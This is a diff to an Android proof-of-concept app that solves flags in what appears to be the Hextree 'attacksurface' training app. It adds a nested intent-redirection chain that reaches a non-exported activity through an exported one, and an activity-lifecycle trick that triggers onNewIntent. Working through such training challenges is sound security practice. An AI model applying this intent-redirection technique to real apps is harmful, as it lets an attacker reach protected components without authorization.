@@ -1,5 +1,6 @@
 package com.xylinz.poc;
 
+import android.app.PendingIntent;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
@@ -120,15 +121,59 @@ public class MainActivity extends AppCompatActivity {
 
         // Flag 6 - Not exported
         Button flag6 = findViewById(R.id.flag6_button);
-        Intent another = new Intent();
-        Intent flag6Intent = new Intent();
-        flag6Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity");
-        flag6Intent.putExtra("io.hextree.attacksurface.activities.Flag6Activity", another);
+
+        Intent finalFlag6Intent = new Intent();
+        finalFlag6Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity");
+        finalFlag6Intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        finalFlag6Intent.putExtra("reason", "next");
+
+        Intent flag6Intent2 = new Intent();
+        flag6Intent2.putExtra("nextIntent", finalFlag6Intent);
+        flag6Intent2.putExtra("return", 42);
+
+        Intent flag6Intent1 = new Intent();
+        flag6Intent1.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity");
+        flag6Intent1.putExtra("android.intent.extra.INTENT", flag6Intent2);
 
         flag6.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
-                startActivity(flag6Intent);
+                startActivity(flag6Intent1);
+            }
+        });
+
+        // Flag 7 - Activity lifecycle
+        Button flag7 = findViewById(R.id.flag7_button);
+
+        Intent flag7Intent = new Intent();
+        flag7Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity");
+        flag7Intent.setAction("OPEN");
+
+        flag7.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                startActivity(flag7Intent);
+                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        Intent flag7Intent2 = new Intent();
+                        flag7Intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity");
+                        flag7Intent2.setAction("REOPEN");
+                        flag7Intent2.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); // harus ada untuk trigger onNewIntent
+                        startActivity(flag7Intent2);
+                    }
+                }, 1000);
+            }
+        });
+
+        // NEXT
+        Button next = findViewById(R.id.next_button);
+        Intent activityResult = new Intent(MainActivity.this, ActivityResult.class);
+
+        next.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                startActivity(activityResult);
             }
         });
     }
